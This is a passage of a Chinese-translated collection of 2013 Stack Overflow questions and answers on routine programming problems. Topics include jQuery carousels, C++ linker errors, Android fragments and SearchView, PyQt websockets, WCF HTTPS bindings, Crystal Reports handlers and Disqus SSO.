            contentType: 'application/json; charset=utf-8',
            data: "{}",
            async: false,
            success: function (response) {
                if (response.d != null) {
                    //$.each(response.d, function (i, response) {
                    $("#mycarousel").html('response.d');
                    element.jcarousel(
                       {
                           pager: true,
                           visible: 6
                       });
                }
                else {

                }
            },
            error: function (xhr) {
            }
        }); 
```

和 webmethod 是这样的：

```
 [WebMethod]
        public static List<string> GetProjectData()
        {
           // here i have 3 list in returnvalue
            foreach (var item in returnvalue)
            {
                var classvalue = item.Soid + "|"
                           + item.ProjectTitle + "|"
                           + item.Role + "|"
                           + item.StartDate + "|"
                           + item.EndDate + "|"
                           + item.Location.Country + "|"
                           + item.Location.State + "|"
                           + item.Location.City + "|";
                string Template = "<li><img src='../Images/DefaultPhotoMale.png' class='"+ classvalue + "' width='40' height='40' alt='image'/></li>";
                list.Add(Template);
            }
            return list;

        } 
```

但问题是，我无法在 jcarousel 中显示图像，我只能看到白框，我无法看到里面的图像，为什么？

![截屏](../Images/382885e31829a58a0ae6e8c1220df4d9.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:00:41.383

我不确定，但你不需要像这样附加元素：

```
var listItem = $(response.d); //I'm guessing reponse.d is your returned li
element.append(listItem); 
```

# matlab - GCOMPILE 是否支持 GFOR？

> ID：15092067
> 
> 赞同：1
> 
> 时间：2013-02-26T14:50:10.657
> 
> 标签：matlab, jacket

我在使用 Jacket 时偶然发现了这个问题。

我在 gfor 循环中使用编译函数（使用 gcompile 编译）。据我所知，这意味着支持：[http ://wiki.accelereyes.com/wiki/index.php/GCOMPILE](http://wiki.accelereyes.com/wiki/index.php/GCOMPILE)

但我观察到，虽然未编译的函数提供了正确的结果，但编译后的函数为所有 gfor 迭代提供了相同的输出：

```
%================
% function[C] = test(A,B)
% C = A+B;
% end
%================

testing = gcompile('test.m');

A = gdouble(1:1:10);
B = gdouble(2:2:20);
C1 = gzeros(10,1);
C2 = gzeros(10,1);

gfor l=1:10
    C1(l) = test(A(l),B(l));
    C2(l) = testing(A(l),B(l));
gend 
```

输出是：

C1 = [ 3,6,9,12,15,18,21,24,27,30]（正确结果）

C2 = [ 3,3,3,3,3,3,3,3,3,3]

你能验证/反驳我的结果吗？我究竟做错了什么？

干杯，安吉拉

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T21:15:25.300

我能够通过在 MATLAB 上运行 Jacket 来重现这种行为。gcompile 似乎无法正常工作在 GFOR 上，并且文档有误。对于那个很抱歉。

# c++ - 初始化指向模板的指针时未解析的外部符号

> ID：15092070
> 
> 赞同：0
> 
> 时间：2013-02-26T14:50:19.747
> 
> 标签：c++, visual-studio-2010, pointers, stack

请看下面的代码

**武器.h**

**

```
#pragma once
#include "GameObject.h"
#include "Stack.h"
#include "Round.h"
class Weapon :
    public GameObject
{
public:
    Weapon(int);
    ~Weapon(void);
    Stack <Round> *stack1(int rounds) ;
    Weapon *next;
    void display();
}; 
```

**

**武器.cpp**

```
#include "Weapon.h"
#include <iostream>

using namespace std;

Weapon::Weapon(int size)
{
    stack1(size);
}

Weapon::~Weapon(void)
{
}

void Weapon::display()
{
    cout << "Weapon Id: " << id << endl;
} 
```

请注意，以上只是一个项目代码的 2 个文件。但是，当我运行它时出现以下错误

```
1>------ Build started: Project: stacksCheck, Configuration: Debug Win32 ------
1>  Weapon.cpp
1>Weapon.obj : error LNK2001: unresolved external symbol "public: class Stack<class Round> * __thiscall Weapon::stack1(int)" (?stack1@Weapon@@QAEPAV?$Stack@VRound@@@@H@Z)
1>C:\Users\yohan\Documents\Visual Studio 2010\Projects\CourseWork2\Debug\CourseWork2.exe : fatal error LNK1120: 1 unresolved externals
========== Build: 0 succeeded, 1 failed, 0 up-to-date, 0 skipped ========== 
```

我 100% 确定这个错误来自这里

```
stack1(size); 
```

每当我删除它时，代码都可以正常工作！

`stack1`是 Stack 类的对象，其中 stack 类的构造函数接受一个整数参数。该类`Stack`是一个模板，位于头文件中

我怎样才能摆脱这个错误？

请帮忙！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T14:52:58.877

好吧，你声明了一个没有提供定义的函数：

```
class Weapon : public GameObject
{
public:
    ...
    Stack <Round> *stack1(int rounds) ; // <=== DECLARATION IS HERE,
                                        //      DEFINITION IS NOWHERE
    ...
}; 
```

显然，链接器抱怨它找不到`Weapon::stack1()`.

> 每当我删除它时，代码都可以正常工作！

难怪，您不再调用已声明但未定义的函数。`Weapon::stack1()`您应该为您的实现文件添加一个定义：

**武器.cpp**

```
...

Stack<Round>* stack1(int round)
{
    ...
} 
```

* * *

**更新：**

> `stack1`是一个`Stack`类的对象，其中堆栈类的构造函数接受一个整数参数。该类`Stack`是一个模板，位于头文件中

当我第一次回答这个问题时，我忽略了这部分。

因此，即使您声明了一个*函数*，您的意图似乎是声明一个*指向*类型对象的指针`Stack<Round>`。在这种情况下，请忘记定义`stack1()`函数，正如我在原始答案中所建议的那样。只需使用正确的语法来声明指针成员变量：

**武器.h**

```
class Weapon : public GameObject
{
public:
    ...
    Stack<Round>* stack1; // IF YOU WANT TO DECLARE A MEMBER POINTER,
                          // THIS IS THE CORRECT SYNTAX.
    ...
}; 
```

然后，在您的`Weapon`类的构造函数中，您可以构造`Stack<Round>`对象并分配指针：

**武器.cpp**

```
Weapon::Weapon(int size)
{
    stack1 = new Stack<Round>(size);
} 
```

另外，不要忘记`delete stack1`in`Weapon`的析构函数：

```
Weapon::~Weapon(int size)
{
    if (stack1)
    {
        delete stack1;
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T14:58:03.613

如果`stack1`应该是`Weapon`（而不是函数）的数据成员，则应将其声明为：

```
class Weapon :
    public GameObject
{
public:
    Weapon(int);
    ~Weapon(void);

    Stack <Round>   stack1;
    Weapon *next;

    void display();
}; 
```

然后在`Weapon`构造函数中初始化它

```
Weapon::Weapon(int size) : stack1(size)
{ } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T14:59:03.810

在 Weapon 构造函数中试试这个：

```
stack1=new Stack <Round>(size); 
```

同时更新 Weapon.h：

```
 Stack <Round> *stack1; 
```

# android - 如何使用片段修复后退导航？

> ID：15092072
> 
> 赞同：1
> 
> 时间：2013-02-26T14:50:20.730
> 
> 标签：android, android-fragments

我在实现后退导航时遇到问题。

活动`A1`开始活动`A2`。`A2`包含一个全屏片段：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/fragment_container"
android:layout_width="match_parent"
android:layout_height="match_parent" >

    <!-- fragment goes here -->

</RelativeLayout> 
```

我在上面`A2`的`onCreate()`容器中加载片段 F1：

```
@Override
protected void onCreate(Bundle arg0) {
    super.onCreate(arg0);
    setContentView(R.layout.activity_main);
    replaceFragment(new AccountHomeFragment());
}

public void replaceFragment(Fragment f){
     FragmentTransaction fragmentTransaction = getSupportFragmentManager().beginTransaction();
     fragmentTransaction.replace(R.id.fragment_container, f);
     fragmentTransaction.addToBackStack(f.getClass().getSimpleName());
     fragmentTransaction.commit();
} 
```

并且在某些时候，用户单击一个按钮，`F1`而`F2`. **问题是当用户单击后退按钮时：**

*   第一次点击：没有任何反应
*   第二次点击：从`F2`到`A1`（`F1`跳过）

我的期望

*   第一次点击：`F2`->`F1`
*   第二次点击：`F1`->`A1`

我注意到，如果我在 F1 被 F2 替换之前按回：

*   第一次点击：`F1`->空白屏幕
*   第二次点击：空白屏幕->`A1`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T14:56:52.230

我认为您的问题也可能是由于将您的第一个片段添加到后台堆栈而引起的。在您的`onCreate`呼叫`replaceFragment`中，它会自动添加它。只需手动添加片段，无需`addToBackStack`调用，并将该`replaceFragment`功能用于所有后续片段事务。

# python - pyqt 和 websocket 客户端。在后台监听 websocket

> ID：15092076
> 
> 赞同：0
> 
> 时间：2013-02-26T14:50:29.780
> 
> 标签：python, websocket, pyqt

我有一个 PyQt Gui 应用程序。此应用程序有一个主窗口，应在启动后打开。

这个应用程序应该监听 websocket。

我试着这样解决它：

```
...

if __name__ == '__main__':
    app = QtGui.QApplication(sys.argv)

    window = Window()
    window.show()

    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("ws://localhost:8080/chatsocket",
                                on_message = on_message,
                                on_error = on_error,
                                on_close = on_close)
#    ws.on_open = on_open

    ws.run_forever()

    sys.exit(app.exec_()) 
```

但是，启动应用程序后，主窗口没有打开。

没有“ws.run_forever()”行，主窗口打开，但应用程序不监听 websocket。

我需要在“背景”中收听 websocket 吗？你能帮助我吗？

PS：（对不起我的英语）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-02T03:55:48.600

感谢无引擎。

我做这个

```
class Window(QtGui.QDialog):
    def __init__(self, parent=None):
        super(Window, self).__init__()

        self.thread = ListenWebsocket()
        self.thread.start()

...

class ListenWebsocket(QtCore.QThread):
    def __init__(self, parent=None):
        super(ListenWebsocket, self).__init__(parent)

        websocket.enableTrace(True)

        self.WS = websocket.WebSocketApp("ws://localhost:8080/chatsocket",
                                on_message = self.on_message,
                                on_error = self.on_error,
                                on_close = self.on_close) 

    def run(self):
        #ws.on_open = on_open

        self.WS.run_forever()

    def on_message(self, ws, message):
        print message

    def on_error(self, ws, error):
        print error

    def on_close(self, ws):
        print "### closed ###"

if __name__ == '__main__':
    app = QtGui.QApplication(sys.argv)

    QtGui.QApplication.setQuitOnLastWindowClosed(False)

    window = Window()
    window.show()

    sys.exit(app.exec_()) 
```

# java - java中的同态过滤

> ID：15092078
> 
> 赞同：1
> 
> 时间：2013-02-26T14:50:39.250
> 
> 标签：java, android, image, image-processing, image-comparison

有谁知道同态过滤的概念和工作及其java实现。我需要比较两个图像。从相机到数据库。我正在使用朴素的相似性算法。它运行良好。但换光是个问题。我们如何解决照明问题。？我被困在测试中。安卓2.2

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-26T05:47:55.427

同态滤波器涉及 5 个步骤。

Image -> {Log(Image) -> FFT -> Frequency Filter -> Inverse Filter -> Exp(Image)} -> Image

下面的代码使用的是[Catalano 框架](https://code.google.com/p/catalano-framework/)

```
FastBitmap fb = new FastBitmap("image.jpg");
fb.toGrayscale();

HomomorphicFilter hf = new HomomorphicFilter(0,80);
hf.applyInPlace(fb); 
```

# python - 如何按字段类型过滤查询集

> ID：15092079
> 
> 赞同：0
> 
> 时间：2013-02-26T14:50:50.593
> 
> 标签：python, django-queryset, django-1.4

我用夹层。它有型号：

```
class AssignedKeyword(Orderable):
    """
    A ``Keyword`` assigned to a model instance.
    """

    keyword = models.ForeignKey("Keyword", related_name="assignments")
    content_type = models.ForeignKey("contenttypes.ContentType")
    object_pk = models.IntegerField()
    content_object = GenericForeignKey("content_type", "object_pk")

    class Meta:
        order_with_respect_to = "content_object"

    def __unicode__(self):
        return unicode(self.keyword) 
```

我想获取所有唯一的 AssignedKeyword 模型实例，其中`content_object`字段类型为`Post`. 如何按字段类型过滤查询集？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:15:35.513

答案很简单：

```
AssignedKeyword.objects.filter(content_type=ContentType.objects.get(name='Product')) 
```

# wcf - WCF Rest - 在一个 ServiceContract 中混合 HTTP 和 HTTPS

> ID：15092081
> 
> 赞同：3
> 
> 时间：2013-02-26T14:50:56.293
> 
> 标签：wcf, http, ssl, https, webhttpbinding

我目前有一个 Http Rest WCF4 服务，由`IEventService`仅通过 HTTP 公开的 ServiceContract 定义。

我的任务是让**一些**OperationContracts 只能通过 HTTPS 工作，所以我将这些方法拆分为一个单独的 ServiceContract，称为`IEventServiceHTTPS`

使用带有自签名证书的 IIS7.5 将其托管在我的开发盒上，作为其中一部分的方法可以`IEventServiceHTTPS`通过 HTTPS 而不是通过 HTTP 调用，正如预期的那样。

但是，现在公开的 HTTP 方法`IEventService`不起作用。

尝试访问 HTTP 方法时，我得到以下信息：

```
HTTP Error 403.4 - Forbidden
The page you are trying to access is secured with Secure Sockets Layer (SSL). 
```

web.config 与我的更改：

```
<system.serviceModel>
    <serviceHostingEnvironment multipleSiteBindingsEnabled="true" aspNetCompatibilityEnabled="true">
      <serviceActivations>
        <add service="Api.EventService" relativeAddress="EventService.svc" factory="Api.UnityServiceHostFactory"/>
      </serviceActivations>
    </serviceHostingEnvironment>
    <behaviors>
      <serviceBehaviors>
        <behavior name="Api.EventServiceBehavior">
          <serviceMetadata httpGetEnabled="true" httpsGetEnabled="true"/>
          <serviceDebug includeExceptionDetailInFaults="true"/>
        </behavior>
      </serviceBehaviors>
      <endpointBehaviors>
        <behavior name="WebBehavior">
          <webHttp/>
        </behavior>
      </endpointBehaviors>
    </behaviors>
    <services>
      <service behaviorConfiguration="Api.EventServiceBehavior" name="Api.EventService">
        <endpoint address="" binding="webHttpBinding" behaviorConfiguration="WebBehavior" bindingConfiguration="webBindingHTTP" contract="Api.IEventService"/>
        **<endpoint address="" binding="webHttpBinding" behaviorConfiguration="WebBehavior" bindingConfiguration="webBindingHTTPS" contract="Api.IEventServiceHTTPS"/>**
      </service>
    </services>
    <bindings>
      <webHttpBinding>
        <binding name="webBindingHTTP">
          <security mode="None"></security>
        </binding>
        **<binding name="webBindingHTTPS">
          <security mode="Transport">
          </security>
        </binding>**
      </webHttpBinding>
    </bindings>
  </system.serviceModel> 
```

任何帮助将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:48:25.480

I believe this error is originating because of IIS vdir [SSL settings]-> Require SSL -> true. If you want both http and https endpoints accessible in the same service then uncheck this setting as this will prevent you from doing unsecure http in the vdir.

# android - SearchView setOnClickListener 不工作

> ID：15092082
> 
> 赞同：4
> 
> 时间：2013-02-26T14:50:57.227
> 
> 标签：android, click, onclicklistener, searchview

任何人都可以看到为什么这不起作用..

我`SearchView`的在`ActionBar`并且总是显示。我想知道用户何时按下`searchview`...而不是何时扩展或获得焦点。

此代码位于 onCreateOptionsMenu

```
SearchView = _searchView;

SearchManager searchManager = (SearchManager) getSystemService(Context.SEARCH_SERVICE);
_searchView = (SearchView) menu.findItem(R.id.menu_finder_text_search).getActionView();
_searchView.setSearchableInfo(searchManager.getSearchableInfo(getComponentName()));
_searchView.setIconifiedByDefault(false); // Do not iconify the widget, we want to keep it open!
_searchView.setFocusable(false);
_searchView.setClickable(true);

_searchView.setOnClickListener(new OnClickListener() {

    @Override
    public void onClick(View v) {
        //DO SOMETHING!
    }
}); 
```

任何人？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2014-01-22T03:41:55.480

SearchView 继承自 LinearLayout，所以我们可以为每个孩子设置 OnClickListener，像这样：

```
public static void setSearchViewOnClickListener(View v, OnClickListener listener) {
    if (v instanceof ViewGroup) {
        ViewGroup group = (ViewGroup)v;
        int count = group.getChildCount();
        for (int i = 0; i < count; i++) {
            View child = group.getChildAt(i);
            if (child instanceof LinearLayout || child instanceof RelativeLayout) {
                setSearchViewOnClickListener(child, listener);
            }

            if (child instanceof TextView) {
                TextView text = (TextView)child;
                text.setFocusable(false);
            }
            child.setOnClickListener(listener);
        }
    }
} 
```

来自：[http ://www.trinea.cn/android/searchview-setonclicklistener-not-working/](http://www.trinea.cn/android/searchview-setonclicklistener-not-working/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T17:23:30.637

好的，它没有回答它只是避免它的问题。我已使用此链接为显示键盘时创建一个侦听器。这给了我一个适合我的时间的活动。

[https://stackoverflow.com/a/7423586/1312937](https://stackoverflow.com/a/7423586/1312937)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-10-27T08:59:48.253

试试这个：

1) 绑定视图

```
@BindView(R.id.search) SearchView search; 
```

2) 在您的 onCreate() 中，编写以下代码。

```
search.setIconifiedByDefault(false);
        search.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                search.setIconified(false);
            }
        }); 
```

3）并且您的 SearchView 应该具有以下属性。

```
 <SearchView
                android:id="@+id/search"
                android:layout_width="match_parent"
                android:layout_height="50dp"
                android:layout_centerVertical="true"
                android:background="@drawable/rounded_corners_box"
                android:drawableLeft="@android:drawable/ic_menu_search"
                android:imeOptions="actionSearch"
                android:inputType="text"
                android:maxLines="1"
                android:queryHint="Search your item.."
                android:textColor="@android:color/black"
                android:textColorHint="@color/colorPrimary"
                app:defaultQueryHint="Select locality"/> 
```

**笔记：**

android:background="@drawable/rounded_corners_box" -- 你的自定义边框 xml 文件。android:drawableLeft="@android:drawable/ic_menu_search" -- 从可绘制文件中搜索图标。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-08-30T14:06:05.553

将 Searchviews 按钮绑定到自定义 ImageView 并在那里添加 onClickListener

```
ImageView searchButton = this.searchView.findViewById(android.support.v7.appcompat.R.id.search_button);    
searchButton.setOnClickListener(v -> {

    // Your code here

    //This is needed since you are overwriting the default click behaviour
    searchView.setIconified(false);
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-26T15:01:38.437

使用界面`OnTouchListener`：http: [//developer.android.com/reference/android/view/View.OnTouchListener.html](http://developer.android.com/reference/android/view/View.OnTouchListener.html)

这需要更多的实现代码，但可以更好地控制 UI。此解决方案假定用户将使用触摸屏与视图交互。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-05-24T00:44:35.393

```
int search_button_id = context.getResources().getIdentifier("android:id/search_button", null, null);
ImageView search_button_view = (ImageView) mSearchView.findViewById(search_button_id);
search_button_view.setOnTouchListener((view, motionEvent) -> {
        mSearchView.setIconified(false);
        return true;
}); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-04-24T18:26:59.050

最近卡在这个问题上，找到了一个简单的解决方案。

```
searchView.setOnQueryTextFocusChangeListener(object : View.OnFocusChangeListener{
        override fun onFocusChange(p0: View?, p1: Boolean) {
            // Enter your code here
        }
    }) 
```

当您点击搜索字段并出现软键盘时，将调用此方法。

# javascript - 在 Jquery 中检索表单字段的值

> ID：15092084
> 
> 赞同：2
> 
> 时间：2013-02-26T14:50:58.897
> 
> 标签：javascript, jquery, html

我在 html 中有一个表单字段，其内容如下：

```
<form id="tasklist">
  <input type="text" id="name" ...></input>
  ... more form elements here ...
</form> 
```

现在在我的 jQuery 代码中，我想获取这些表单元素的值，但是我无法看到我在使用以下代码时做错了什么：

```
$(document).ready(function(){
  $("#tasklist").submit(function(){
    alert($("#name").val()); // This does not alert anything on form submit
  });
}); 
```

我已经确保我所有的 html id 都是唯一的，javascript 代码放置在文档的底部，在脚本标签中，并且放置在那里的任何其他警报都有效（即 alert("hello world"); 放在提交方法之前。

我在stackoverflow上看到了其他一些类似的问题，即（[Jquery表单字段值](https://stackoverflow.com/questions/2389256/jquery-form-field-value)和[检索Jquery中输入文本字段的值](https://stackoverflow.com/questions/3145739/retrieving-the-value-of-an-input-text-field-in-jquery)）但它们似乎没有解决我的问题。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T14:53:03.493

提交表单后，页面会重新加载。你需要防止这种情况！

```
$(document).ready(function(){
  $("#tasklist").on('submit', function(e){
     e.preventDefault();
     alert( $("#name").val() );
  });
}); 
```

并正确关闭功能！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T14:53:15.167

你有一些错别字：功能没有关闭。它会导致 JS 错误并可能停止脚本执行。

尝试 ：

```
$(document).ready(function(){
  $("#tasklist").submit(function(){
    alert($("#name").val()); // This does not alert anything on form submit
  });
}); 
```

**更新**

基本小提琴示例：http: [//jsfiddle.net/UQTY2/28/](http://jsfiddle.net/UQTY2/28/)

# c# - enunciate 是否支持为基于 REST 的接口生成 C# 客户端？

> ID：15092096
> 
> 赞同：1
> 
> 时间：2013-02-26T14:51:31.293
> 
> 标签：c#, rest, jax-rs, enunciate

我有一个带有一些基于 REST 的接口的项目，并希望为它们生成 C# 代码。可以发音帮助我这样做还是仅适用于 WS* 接口？

在调试模式下运行 enunciate 使用`mvn -X`我可以看到消息：

```
[DEBUG] [csharp] C# module is disabled because there are no endpoint interfaces, nor any XML types 
```

你知道任何其他可以用来做这件事的工具吗？

最好的，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-06T20:24:17.527

不幸的是，Enunciate 还没有生成 REST 客户端。[不过，它已被请求](http://jira.codehaus.org/browse/ENUNCIATE-760)。

# objective-c - Objective-C/Cocoa 块文件上传

> ID：15092101
> 
> 赞同：0
> 
> 时间：2013-02-26T14:51:46.497
> 
> 标签：objective-c, cocoa, file-upload

我对 Objective-C/Cocoa 开发比较陌生。我目前正在开发一个 Mac 应用程序，我需要使用 HTTP PUT 请求将文件上传到 Web 服务器。我想将文件分成几个块并将其流式传输到服务器，而不是将整个文件读入内存并一次性上传。

我遇到了几个第三方库（即：ASIHTTPRequest、AFNetworking），它们可以开箱即用地支持此功能。但是，由于项目的一些限制，我想暂时不使用第三方。

非常感谢这方面的任何帮助。提前致谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T16:05:23.700

如果您只是上传文件，没有 Multipart MIME 包装器，那么我相信您可以直接从 NSMutableURLRequest 设置输入流。使用 +[NSInputStream inputStreamWithFileAtPath:] 为磁盘上的文件获取 NSInputStream 很容易。我自己并没有完全做到这一点，但我认为它会起作用。

如果您最终需要执行 Multipart MIME 包装器，那么我建议您使用库。做对是一件很痛苦的事，并且根据您运行的操作系统版本，有一些怪癖需要处理。

# php - 将php文件加载到具有动态元素高度的跨域页面中

> ID：15092103
> 
> 赞同：1
> 
> 时间：2013-02-26T14:51:48.830
> 
> 标签：php, jquery

我正在尝试将我的一个 Web 服务器上的脚本加载到另一个服务的托管站点上的页面中。目前，我正在使用 iframe 来完成这项工作。我遇到的问题是 iframe 无法根据 php 的输出动态扩展。

向我提出的建议是尝试将 php 输出注入 div，但我认为我不能跨域。

我从 example.net/scripts 上的 Web 服务器开始，我可以完全访问它，并将其加载到 example.us 上的页面中，因为它是托管服务（即 enjin），所以我对其访问权限非常有限。

我需要的是一个解决方案，它允许我从 Web 服务器调用 php 脚本，并在页面上显示它的输出，该元素可以根据脚本的输出进行扩展。当它拉取 php 脚本时，它需要在 CSS 中为 div （最小高度、最大高度）预定义的 CSS 参数中显示，但仅在脚本中返回的元素的高度处显示。

为了进一步澄清，我正在使用 php 脚本为来自 TwitchTV 的 API 的 json 输出执行 foreach 循环。当 foreach 循环运行时，它为每个返回的结果构建一个元素结构，以根据需要显示它们。如果我有太多返回，我最终会溢出 iframe，如果我没有返回，它只会返回一个字符串并显示它，但此时 iframe 的高度太高。

任何人都可以给我的例子或解决方案建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T03:22:25.800

由于您可以使用 AJAX，因此您的解决方案是使用 AJAX 调用非锁定站点上的代码，并返回包含内容的框。在锁定站点上，处理该代码，然后将其粘贴`<div>`到锁定站点上。当然，该 div 可以像往常一样扩展以适应内容。

如果出于某种原因，您必须使用 iframe，只需使用 javascript 收集框的高度（如果需要，您可以将框隐藏到左侧`left: -9999px`）。使用该高度信息来设置 iframe 的高度。所以你基本上是两次加载 iframe 的内容。一次通过 ajax 只是为了获得高度，一次通过实际的 iframe。

我真的看不出有任何理由认为 iframe 是必要的——第一段中的过程应该可以正常工作。

# asp.net - 在 Asp.net 4.0 Crystal 报表中显示图像

> ID：15092111
> 
> 赞同：2
> 
> 时间：2013-02-26T14:52:12.153
> 
> 标签：asp.net, iis-7, crystal-reports

我正在将 .net 3.5 ASP.net 水晶报表应用程序迁移到 4.0，但无法让报表与图像一起显示。

使用 httphandlers 和 handlers 部分保持 web.config 文件不变，如下所示：

```
 <httpHandlers>
      <add verb="GET" path="CrystalImageHandler.aspx" type="CrystalDecisions.Web.CrystalImageHandler, CrystalDecisions.Web, Version=10.5.3700.0, Culture=neutral, PublicKeyToken=692fbea5521e1304" />
    </httpHandlers>
  </system.web>
...
<system.webServer>
    <validation validateIntegratedModeConfiguration="false" />
    <handlers>      
      <add name="CrystalImageHandler.aspx_GET" verb="GET" path="CrystalImageHandler.aspx" type="CrystalDecisions.Web.CrystalImageHandler, CrystalDecisions.Web, Version=10.5.3700.0, Culture=neutral, PublicKeyToken=692fbea5521e1304" preCondition="integratedMode" />
    </handlers> 
```

结果是：

> **HTTP 错误 500.19 - 内部服务器错误**
> 
> 无法添加类型为“add”且唯一键属性“name”设置为“CrystalImageHandler.aspx_GET”的重复集合条目

从 web.config 文件中删除处理程序部分会成功显示报告，但没有图像。

我担心升级报告查看器版本，因为我看不到在我们拥有的时间范围内重新分配水晶查看器 13 的明确方法（与我们过去几年成功使用的版本 10.5 相比）。有没有人有这方面的经验？如何更改 web.config 文件以显示报告和显示图像？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:02:44.073

我根据您的评论更新了解决方案

```
 <handlers>      
 <remove name="CrystalImageHandler.aspx_GET"/> 
  <add name="CrystalImageHandler.aspx_GET" verb="GET" path="CrystalImageHandler.aspx" type="CrystalDecisions.Web.CrystalImageHandler, CrystalDecisions.Web, Version=10.5.3700.0, Culture=neutral, PublicKeyToken=692fbea5521e1304" preCondition="integratedMode" />
</handlers> 
```

# jquery-ui - jQuery UI sortable 将可排序的行与不可排序的行连接起来

> ID：15092113
> 
> 赞同：1
> 
> 时间：2013-02-26T14:52:13.713
> 
> 标签：jquery-ui, jquery-ui-sortable

我一直在为 cms 系统开发一个小页面排序系统。目前我正在一个表格中显示我的数据（所有页面），这要归功于 jQuery UI。唯一的问题是没有子页面行被分配给任何父行，例如列表对象内的未排序列表等。我做了一个小例子来向你们展示我的意思。

[http://www.lautenbagreclame.nl/stackover_example.jpg](http://www.lautenbagreclame.nl/stackover_example.jpg)

```
$('table#pages-overview tbody').sortable({

    handle : 'i.icon-resize-vertical',
    opacity : 0.3,
    placeholder : 'drag-drop-table-row',
    axis : 'y',
    helper: fixHelper,
    forceHelperSize: true,
    cursor: 'n-resize',
    zIndex: 9999,
    start: function(event, ui) {

        elementObjPagesOverview.children('tr').each(function() {
            if($(this).data('group') != ui.helper.data('group')) {
                // row isnt in the same group... so not allowed to connect !
            } else {
                // row is in the same group... so allowed to connect !
            }
        });

    }

}); 
```

整个表是动态构建的。希望有人可以帮助我解决这个问题。

谢谢！

# asp.net-mvc - Disqus 与 ASP.NET MVC 的集成

> ID：15092124
> 
> 赞同：1
> 
> 时间：2013-02-26T14:52:44.083
> 
> 标签：asp.net-mvc, asp.net-mvc-4, disqus

我们只想将 Disqus 评论系统与我们正在尝试使用 Disqus SSO 功能的 asp.net mvc 应用程序集成。按照以下网址中所述的步骤进行操作：

1.  [http://help.disqus.com/customer/portal/articles/236206-single-sign-on](http://help.disqus.com/customer/portal/articles/236206-single-sign-on)
2.  [http://help.disqus.com/customer/portal/articles/472100-author-specific-moderation](http://help.disqus.com/customer/portal/articles/472100-author-specific-moderation)

但无法使用已实施的 Disqus SSO 发表评论。

以下项目用于/参考与 Disqus SSO 集成：

1.  [https://github.com/disqus/DISQUS-API-Recipes/blob/master/cs/sso/DisqusSSO.cs](https://github.com/disqus/DISQUS-API-Recipes/blob/master/cs/sso/DisqusSSO.cs)
2.  JS 实现，参考 Snap-1
3.  控制器/动作实现，参考 Snap-2
4.  它是如何运行的，请参阅 Snap-3

还参考了以下示例：[https ://github.com/Gigya-Inc/disqus-integration-demo](https://github.com/Gigya-Inc/disqus-integration-demo)

我们缺少任何东西来实现我们的目标 - “我们的应用程序的经过身份验证的用户无需重新登录即可通过 Disqus 发表评论”？

或者有没有更好的方法？

图片：

-------------- 快照 1 ------------ ![在此处输入图像描述](../Images/b3771e639f367aff0bf747cadb9c5c92.png)

--------------- Snap-2 ----------- ![在此处输入图像描述](../Images/84a4ed9e892dec606a2ab57d587395c9.png)

--------------------- 快照 3 ----------------- ![在此处输入图像描述](../Images/966e3d6c30fc999521eaea1ed008d25a.png)

**更新 - 2013 年 3 月 3 日** SSO 注册后，计划 99.0 美元，我们尝试再次集成它，但好运仍然很远！见下图，但是，我们没有更改任何代码。刚刚根据我们启用了 sso 的新帐户更改了密钥和公钥。

![在此处输入图像描述](../Images/ea39d08e475b9a5a27fc6d05dc8e202a.png) ![在此处输入图像描述](../Images/9bb57eee4ff4ac463a7ed14ca34530dd.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T05:24:37.057

仅当您的帐户添加了 Disqus SSO 插件时才有效，可以在此处完成：[https ://disqus.com/account/addons/signup/](https://disqus.com/account/addons/signup/)

其他一切对我来说都是正确的。

# java - 集群和负载均衡的区别？

> ID：15092137
> 
> 赞同：45
> 
> 时间：2013-02-26T14:53:22.247
> 
> 标签：java, tomcat, web-applications, cluster-computing

**集群**和**负载均衡**有什么区别？

我知道这是一个简单的问题。但是我问了几个人这个问题，但没有人给出可靠的答案。

我也用谷歌搜索了很多，无法得到确切的答案。

希望我们的 Stack 用户能给我最好的答案。

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2013-02-26T14:58:29.877

来自[软件期刊博客](http://standardwisdom.com/softwarejournal/2009/09/clustering-vs-load-balancing-what-is-the-difference/)的摘录。

> 聚类具有形式意义。集群是一组试图实现共同目标并相互了解的资源。集群通常涉及设置资源（通常是服务器）以在特定通道（端口）上交换详细信息并不断交换它们的状态，因此资源的状态也会在其他地方复制。它通常还包括负载均衡，其中，根据负载均衡策略将请求路由到集群中的某个资源。
> 
